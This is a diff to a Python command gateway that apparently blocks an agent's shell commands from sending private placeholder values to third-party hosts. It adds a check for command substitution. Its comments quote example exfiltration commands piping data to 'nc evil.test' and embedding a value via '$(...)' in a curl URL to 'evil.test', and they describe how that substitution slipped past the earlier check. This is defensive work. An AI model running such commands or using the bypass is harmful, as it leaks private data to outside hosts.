@@ -73,6 +73,13 @@ _HTTP_URL_RE = re.compile(r"https?://[^\s\"'<>`|\\]+", re.IGNORECASE)
 # on its own: `echo IP_PRIVATE_001 | nc evil.test 9000` is an exfiltration even
 # though its first word is a harmless print sink.
 _PIPELINE_OPS = ("||", "&&", "|", ";", "&")
+# Command substitution and parameter expansion. `shlex.split` tears
+# `curl http://evil.test/$(echo IP_PRIVATE_001)` into a URL token with no
+# placeholder in it and a separate placeholder token, so the per-token URL check
+# saw nothing to object to and the address was rehydrated straight into a request
+# to a third party. Whatever a substitution expands to is not analysable here, so
+# a placeholder sharing a segment with one is never resolved.
+_CMD_SUBST_RE = re.compile(r"\$\(|\$\{|`")
 # Flags that take a separate value; that value is never the destination host.
 _VALUE_FLAGS = {"-p", "-P", "-l", "-i", "-o", "-b", "-c", "-m", "-w", "-s", "-F", "-e", "-L", "-R", "-D"}
 
@@ -514,7 +521,13 @@ class CommandGateway:
                 if refused is not None:
                     return refused
 
-            # 2b) Per-token URL analysis (the classic exfil vector).
+            # 2b) Command substitution: we cannot see where the expansion lands.
+            if _CMD_SUBST_RE.search(segment):
+                refused = hold(seg_phs, "value inside a command substitution (destination unknown)")
+                if refused is not None:
+                    return refused
+
+            # 2c) Per-token URL analysis (the classic exfil vector).
             for tok in argv:
                 reason = self._url_context_block_reason(tok)
                 if reason is not None:
@@ -522,7 +535,7 @@ class CommandGateway:
                     if refused is not None:
                         return refused
 
-            # 2c) Outbound request bodies (curl/wget POST/upload).
+            # 2d) Outbound request bodies (curl/wget POST/upload).
             for i, tok in enumerate(argv):
                 if tok in _OUTBOUND_DATA_FLAGS:
                     in_body = PLACEHOLDER_ANY_RE.findall(argv[i + 1] if i + 1 < len(argv) else "")
@@ -535,7 +548,7 @@ class CommandGateway:
                     if refused is not None:
                         return refused
 
-            # 2d) Bare network sinks (nc/telnet/ssh/...): the destination must be
+            # 2e) Bare network sinks (nc/telnet/ssh/...): the destination must be
             #     the target itself, never a literal third party. `ssh
             #     admin@IP_PRIVATE_001` and `scp f user@IP_001:/tmp` are ordinary
             #     lateral movement; the old check compared the *whole* argument
